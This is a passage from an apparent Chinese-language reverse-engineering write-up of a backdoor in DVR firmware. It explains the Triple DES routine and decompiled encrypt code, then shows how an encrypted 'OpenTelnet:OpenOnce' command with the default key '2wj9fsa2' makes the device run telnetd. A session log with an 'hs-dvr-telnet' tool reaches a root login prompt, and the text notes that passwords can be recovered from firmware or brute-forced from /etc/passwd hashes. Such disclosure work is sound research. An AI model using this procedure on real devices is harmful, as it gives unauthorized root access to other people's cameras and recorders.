
2. 构造函数 `init` 初始化 `triple_des` 类的对象。构造函数接收以下参数：

   1. `key`: 加密密钥，可以是 16 或 24 字节长的字节数组。如果是 16 字节长，将使用 DES-EDE2 模式，如果是 24 字节长，将使用 DES-EDE3 模式。

   2. `mode`: 加密模式，可以是 `ECB`（电子密码本模式）或 `CBC`（密码块链接模式），默认为 `ECB`。

   3. `IV`: 初始化向量（只在 `CBC` 模式下需要），必须是 8 字节长的字节数组。

   4. `pad`: 填充字符（可选参数），用于加密数据时对不足 8 字节的数据进行填充。

   5. `padmode`: 填充模式（可选参数），可以是 `PAD_NORMAL` 或 `PAD_PKCS5`，默认为 `PAD_NORMAL`。

   6. `hs`: 是否进行硬件加速（可选参数），默认为 `False`，表示不使用硬件加速。

3. `setKey` 方法用于设置加密密钥。根据传入的 `key` 的长度，判断使用 DES-EDE2 还是 DES-EDE3 模式。然后创建三个 `des` 类的实例，分别用于处理三个部分的加密解密。

4. `setMode`、`setPadding`、`setPadMode` 和 `setIV` 方法用于设置加密模式、填充字符、填充模式和初始化向量，并将设置传递给三个 `des` 实例。

5. `encrypt` 方法用于对输入的数据进行加密。它接收以下参数：

   1. `data`: 要加密的数据，必须是长度为 8 的倍数的字节数组。

   2. `pad`: 可选参数，用于加密数据时对不足 8 字节的数据进行填充，必须是长度为 1 的字节数组。

   3. `padmode`: 可选参数，用于指定填充模式，可以是 `PAD_NORMAL` 或 `PAD_PKCS5`。方法首先将数据进行填充，然后根据加密模式进行加密，最后返回加密后的数据。

6. `decrypt` 方法用于对输入的数据进行解密。它接收以下参数：

   1. `data`: 要解密的数据，必须是长度为 8 的倍数的字节数组。

   2. `pad`: 可选参数，用于解密数据时对最后 8 字节的填充字符进行移除，必须是长度为 1 的字节数组。

   3. `padmode`: 可选参数，用于指定填充模式，可以是 `PAD_NORMAL` 或 `PAD_PKCS5`。方法首先根据加密模式进行解密，然后根据填充模式对解密数据进行处理，最后返回解密后的数据。

7. 注意：这里的 `des` 类指的是之前提到的单独的 DES 加密算法类，而不是 Triple DES 的类。Triple DES 类在内部使用了三个单独的 DES 加密实例来完成加密和解密过程。

参考此代码写出具体的加密算法，将加密结果拼接在`randNum`字符串后面

```
int encrypt(char *result,char *data,uint data_len,char *key,uint key_size)
{
  uint uVar2;
  int currentBlockNumber;
  int blocksCount;
  if (((result != (char *)0x0 && data != (char *)0x0) &&
      (currentBlockNumber = 0, key != (char *)0x0)) && ((data_len + 7 & 0xfffffff8) != 0)) {
    prepare_key(key,key_size);
    blocksCount = (int)(data_len + 7) >> 3;
    uVar2 = *(state + 0x7e0);
    if (*(state + 0x7e0) == 0) {
      while ((int)uVar2 < blocksCount) {
        cipher_box((byte *)result,(byte *)data,state + 0x1e0,0);
        uVar2 = uVar2 + 1;
        result = (char *)((byte *)result + 8);
        data = (char *)((byte *)data + 8);
      }
    }
    else {
      while (currentBlockNumber < blocksCount) {
        cipher_box((byte *)result,(byte *)data,state + 0x1e0,0);
        cipher_box((byte *)result,(byte *)result,state + 0x4e0,1);
        cipher_box((byte *)result,(byte *)result,state + 0x1e0,0);
        currentBlockNumber = currentBlockNumber + 1;
        result = (char *)((byte *)result + 8);
        data = (char *)((byte *)data + 8);
      }
    }
    return 0;
  }
  return -1;
}
```

之后经判断输出`verify:OK`

![图片描述](https://bbs.kanxue.com/upload/attach/202308/937578_PWJXG8U6BM9YYTW.png)

最后再次判断接收到的字符串开头是否为`CMD`，这里的 `dencrypt` 对应上面的加密算法，判断解密后的字符串是否为`Telnet:OpenOnce`，也就是只需将这个字符串经过相同的加密算法即可，从而执行`system("telnetd")`函数，开启后门。

![图片描述](https://bbs.kanxue.com/upload/attach/202308/937578_H5D35F4WRA2ZWVV.png)

一旦 `telnet` 守护进程激活，可以用以下登录名/密码对之一：

![图片描述](https://bbs.kanxue.com/upload/attach/202308/937578_YGSXNGKXFMBFYHX.png)

这些密码可以从固件中恢复，也可以通过`/etc/passwd`文件中的哈希值进行暴力破解

## 测试漏洞

最常见的 PSK 是默认值之一：`2wj9fsa2` 会话示例：

```
$ telnet 198.51.100.23
Trying 198.51.100.23...
telnet: Unable to connect to remote host: Connection refused
$ ./hs-dvr-telnet 198.51.100.23 2wj9fsa2
Sent OpenTelnet:OpenOnce command.
randNum:46930886
challenge=469308862wj9fsa2
verify:OK
Open:OK
$ telnet 198.51.100.23
Trying 198.51.100.23...
Connected to 198.51.100.23.
Escape character is '^]'.
LocalHost login: root
Password:
```
